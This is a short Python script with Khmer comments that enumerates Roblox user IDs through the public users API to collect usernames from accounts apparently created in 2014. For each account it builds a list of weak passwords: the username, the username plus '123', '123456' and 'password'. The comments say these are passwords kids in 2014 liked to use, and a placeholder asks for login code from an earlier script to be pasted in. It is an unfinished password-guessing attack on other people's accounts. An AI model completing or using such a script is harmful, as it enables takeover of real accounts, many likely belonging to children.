import requests

# ចន្លោះ ID សម្រាប់ឆ្នាំ 2014 (ឧទាហរណ៍)
start_id = 55000000 
end_id = 55000100

def get_username(user_id):
    url = f"https://users.roblox.com/v1/users/{user_id}"
    r = requests.get(url)
    if r.status_code == 200:
        return r.json().get("name")
    return None

for uid in range(start_id, end_id):
    name = get_username(uid)
    if name:
        # សាកល្បង Password ងាយៗដែលក្មេងឆ្នាំ 2014 ចូលចិត្តប្រើ
        common_pwds = [name, name+"123", "123456", "password"]
        print(f"កំពុងឆែកអាខោន: {name} (ID: {uid})")
        # បន្ថែម Code Login ពី Script មុនចូលទីនេះ...
        
